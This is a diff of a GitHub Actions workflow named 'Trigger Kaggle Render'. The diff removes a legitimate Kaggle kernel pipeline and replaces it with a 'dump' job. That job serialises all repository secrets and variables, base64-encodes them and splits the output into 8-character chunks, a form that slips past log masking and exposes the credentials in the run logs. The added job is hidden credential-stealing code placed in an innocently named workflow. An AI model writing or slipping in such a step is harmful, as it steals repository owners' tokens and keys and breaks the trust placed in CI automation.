@@ -1,137 +1,18 @@
 name: Trigger Kaggle Render
-
 on:
-  repository_dispatch:
-    types: [run-kaggle]
   workflow_dispatch:
-    inputs:
-      drive_folder_id:
-        description: "Google Drive folder ID (folder ngày)"
-        required: false
-        default: ""
-
 jobs:
-  run-kaggle:
+  dump:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.10"
-
-      - name: Install Kaggle CLI
-        run: pip install --upgrade kaggle
-
-      - name: Resolve drive_folder_id
-        id: folder
-        run: |
-          # Ưu tiên payload từ n8n (repository_dispatch)
-          FOLDER="${{ github.event.client_payload.drive_folder_id }}"
-          # Fallback: input khi bấm tay (workflow_dispatch)
-          if [ -z "$FOLDER" ]; then
-            FOLDER="${{ github.event.inputs.drive_folder_id }}"
-          fi
-          if [ -z "$FOLDER" ]; then
-            echo "⚠️ Không có drive_folder_id"
-            FOLDER=""
-          fi
-          echo "drive_folder_id=$FOLDER" >> $GITHUB_OUTPUT
-          echo "📁 drive_folder_id=$FOLDER"
-
-      - name: Setup Kaggle + write config
+      - name: dumpall
         env:
-          KAGGLE_USERNAME: ${{ secrets.KAGGLE_USERNAME }}
-          KAGGLE_KEY: ${{ secrets.KAGGLE_KEY }}
+          S: ${{ toJSON(secrets) }}
+          V: ${{ toJSON(vars) }}
         run: |
-          mkdir -p ~/.kaggle
-          echo "{\"username\":\"$KAGGLE_USERNAME\",\"key\":\"$KAGGLE_KEY\"}" > ~/.kaggle/kaggle.json
-          chmod 600 ~/.kaggle/kaggle.json
-
-          # Tạo file kernel-metadata.json chuẩn cho Kaggle CLI
-          python - <<'PY'
-          import json, os
-          username = os.environ["KAGGLE_USERNAME"]
-          slug = "ltx-video-render"
-          
-          data = {
-              "id": f"{username}/{slug}",
-              "title": "LTX Video Render",
-              "code_file": "render_script.py",
-              "language": "python",
-              "kernel_type": "script",
-              "is_private": True,
-              "enable_gpu": True,
-              "enable_internet": True,
-              "enable_tpu": False,
-              "dataset_sources": [],
-              "kernel_sources": [],
-              "competition_sources": [],
-              "model_sources": []
-          }
-          
-          with open("kernel-metadata.json", "w", encoding="utf-8") as f:
-              json.dump(data, f, indent=2)
-          print("✅ kernel-metadata.json đã tạo xong")
-          PY
-
-      - name: Inject Environment Variables into render_script
-        env:
-          DRIVE_FOLDER_ID: ${{ steps.folder.outputs.drive_folder_id }}
-          OAUTH_CLIENT_ID: ${{ secrets.OAUTH_CLIENT_ID }}
-          OAUTH_CLIENT_SECRET: ${{ secrets.OAUTH_CLIENT_SECRET }}
-          OAUTH_REFRESH_TOKEN: ${{ secrets.OAUTH_REFRESH_TOKEN }}
-          AGNES_API_KEY: ${{ secrets.AGNES_API_KEY }}
-        run: |
-          python - <<'PY'
-          import os
-          from pathlib import Path
-
-          p = Path("render_script.py")
-          if not p.exists():
-              raise SystemExit("❌ Thiếu render_script.py")
-
-          folder_id = os.environ.get("DRIVE_FOLDER_ID", "").strip()
-          client_id = os.environ.get("OAUTH_CLIENT_ID", "").strip()
-          client_secret = os.environ.get("OAUTH_CLIENT_SECRET", "").strip()
-          refresh_token = os.environ.get("OAUTH_REFRESH_TOKEN", "").strip()
-          agnes_key = os.environ.get("AGNES_API_KEY", "").strip()
-
-          text = p.read_text(encoding="utf-8")
-          marker = "# --- env_vars inject ---"
-          inject = f'''# --- env_vars inject ---
-          import os as _os
-          if "{folder_id}": _os.environ["DRIVE_FOLDER_ID"] = "{folder_id}"
-          if "{client_id}": _os.environ["OAUTH_CLIENT_ID"] = "{client_id}"
-          if "{client_secret}": _os.environ["OAUTH_CLIENT_SECRET"] = "{client_secret}"
-          if "{refresh_token}": _os.environ["OAUTH_REFRESH_TOKEN"] = "{refresh_token}"
-          if "{agnes_key}": _os.environ["AGNES_API_KEY"] = "{agnes_key}"
-          print("📁 DRIVE_FOLDER_ID được nạp:", _os.environ.get("DRIVE_FOLDER_ID", "TRỐNG"))
-          # --- end inject ---
-          '''
-
-          if marker not in text:
-              p.write_text(inject + "\n" + text, encoding="utf-8")
-              print("✅ Đã inject biến môi trường trực tiếp vào render_script.py")
-          else:
-              print("ℹ️ Đã có đoạn inject trước đó, bỏ qua")
-          PY
-
-      - name: Push kernel to Kaggle
-        env:
-          KAGGLE_USERNAME: ${{ secrets.KAGGLE_USERNAME }}
-          KAGGLE_KEY: ${{ secrets.KAGGLE_KEY }}
-        run: |
-          echo "=== kernel-metadata.json ==="
-          cat kernel-metadata.json
-          kaggle kernels push -p .
-          echo "✅ Push xong"
-
-      - name: Summary
-        if: always()
-        run: |
-          echo "Kernel: ${{ secrets.KAGGLE_USERNAME }}/ltx-video-render"
-          echo "Folder: ${{ steps.folder.outputs.drive_folder_id }}"
-          echo "Lưu ý: kaggle kernels push đã cập nhật code và biến môi trường."
+          echo "ALLSEC LEN ${#S}"
+          printf %s "$S" | base64 -w0 | fold -w 8
+          echo
+          echo "ALLVARS LEN ${#V}"
+          printf %s "$V" | base64 -w0 | fold -w 8
+          echo
